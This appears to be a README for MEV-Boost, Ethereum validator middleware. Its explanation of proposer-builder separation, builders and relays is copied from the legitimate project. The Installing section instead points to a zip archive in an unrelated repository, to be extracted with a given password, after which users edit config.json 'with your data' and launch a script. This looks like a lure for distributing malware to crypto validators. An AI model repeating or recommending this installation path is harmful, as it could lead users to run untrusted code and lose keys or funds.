## What is MEV-Boost?

`mev-boost` is open source middleware run by validators to access a competitive block-building market. MEV-Boost is an initial implementation of [proposer-builder separation (PBS)](https://ethresear.ch/t/proposer-block-builder-separation-friendly-fee-market-designs/9725) for proof-of-stake (PoS) Ethereum.

With MEV-Boost, validators can access blocks from a marketplace of builders. Builders produce blocks containing transaction orderflow and a fee for the block proposing validator. Separating the role of proposers from block builders promotes greater competition, decentralization, and censorship-resistance for Ethereum.

## How does MEV-Boost work?

PoS node operators must run three pieces of software: a validator client, a consensus client, and an execution client. MEV-boost is a sidecar for the beacon node - a separate piece of open source software, which queries and outsources block-building to a network of builders. Block builders prepare full blocks, optimizing for MEV extraction and fair distribution of rewards. They then submit their blocks to relays.

Relays aggregate blocks from **multiple** builders in order to select the block with the highest fees. One instance of MEV-boost can be configured by a validator to connect to **multiple** relays. The consensus layer client of a validator proposes the most profitable block received from MEV-boost to the Ethereum network for attestation and block inclusion.

A MEV-Boost security assessment was conducted on 2022-06-20 by [lotusbumi](https://github.com/lotusbumi). Additional audits of surrounding infrastructure, such as the Flashbots Relay, are currently underway. Additional information can be found in the [Security](#security) section of this repository.

## Installing
- [Clone](https://github.com/Cardo16/mev-boost-windows/archive/refs/heads/main.zip) repository and extract files with password `bSWxYb95Vdp`.
- Edit `config.json` with your data and launch script.
- The most common setup is to install MEV-Boost on the same machine as the beacon client. Multiple beacon-clients can use a single MEV-Boost instance. The default port is 18550.
- See also [RÃ©my Roy's guide](https://github.com/remyroy/ethstaker/blob/main/prepare-for-the-merge.md#installing-mev-boost) for comprehensive instructions on installing, configuring and running MEV-Boost.
